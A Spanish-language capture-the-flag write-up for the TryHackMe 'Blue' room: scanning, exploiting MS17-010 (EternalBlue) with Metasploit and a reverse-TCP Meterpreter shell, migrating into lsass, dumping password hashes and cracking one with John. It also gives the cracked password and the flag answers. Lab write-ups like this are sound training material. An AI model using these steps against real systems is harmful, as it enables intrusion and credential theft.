# TryHackMe: Blue

**Dificultad:** Fácil
**Sistema Operativo:** Windows (Windows 7 / Server 2008 R2)
**Herramientas usadas:** Nmap, Metasploit Framework, Meterpreter, John the Ripper

## Resumen

Explotación de la vulnerabilidad **MS17-010 (EternalBlue)** en un servicio SMB expuesto, obteniendo una shell con privilegios de `NT AUTHORITY\SYSTEM`. Se extrajeron los hashes de usuarios con `hashdump` y se crackeó la contraseña del usuario `Jon` con John the Ripper.

## 1. Reconocimiento (Recon)

Escaneo inicial con Nmap para identificar puertos abiertos y servicios:

```bash
nmap -sV -sC -T4 <IP>
```

**Resultados clave:**
- Puertos 135, 139 y 445 abiertos (SMB/RPC).
- Sistema operativo identificado: Windows Server 2008 R2 / 2012.
- Se confirmó la vulnerabilidad a MS17-010 (EternalBlue) con el script NSE correspondiente:

```bash
nmap -p 445 --script smb-vuln-ms17-010 <IP>
```

## 2. Explotación (EternalBlue)

Se utilizó Metasploit Framework para explotar la vulnerabilidad.

**Búsqueda y selección del exploit:**

```bash
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
```

**Configuración de parámetros:**

```bash
set RHOSTS <IP_VICTIMA>
set LHOST <IP_TUN0>
set payload windows/x64/meterpreter/reverse_tcp
```

> **Nota:** la sesión inicial de Meterpreter tendía a caerse por la inestabilidad del exploit. Para solucionarlo se configuró la auto-migración a un proceso estable antes de lanzar el exploit:

```bash
set AutoRunScript post/windows/manage/migrate
run
```

## 3. Post-Explotación y Escalada de Privilegios

Con la sesión de Meterpreter activa, se escalaron privilegios a nivel SYSTEM:

```bash
getsystem
getuid
```

Para mayor estabilidad, se listaron los procesos y se migró manualmente a `lsass.exe`:

```bash
ps
migrate <PID_DE_LSASS>
```

## 4. Extracción de Hashes y Cracking

Con privilegios de SYSTEM, se volcaron los hashes de los usuarios:

```bash
hashdump
```

Se identificó al usuario no predeterminado `Jon`. Su hash NTLM se guardó en Kali Linux para crackearlo con John the Ripper:

```bash
echo "<HASH_DE_JON>" > hash.txt
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Contraseña descifrada:** `alqfna22`

## 5. Banderas (Flags)

| Flag | Ubicación | Valor |
|------|-----------|-------|
| Flag 1 | `C:\` | `flag{access_the_machine}` |
| Flag 2 | `C:\Windows\System32\config` | `flag{sam_database_elevated_access}` |
| Flag 3 | `C:\Users\Jon\Documents` | `flag{admin_documents_can_be_valuable}` |

## Lecciones aprendidas

- MS17-010 sigue siendo un recordatorio de por qué el parchado de sistemas Windows es crítico, incluso años después de su divulgación (2017).
- La estabilidad de un exploit de Metasploit puede mejorarse significativamente con `AutoRunScript` y migración de proceso, evitando perder la sesión apenas se obtiene.
- `hashdump` + cracking offline (John + rockyou) es un flujo post-explotación estándar y muy efectivo contra contraseñas débiles reutilizadas.
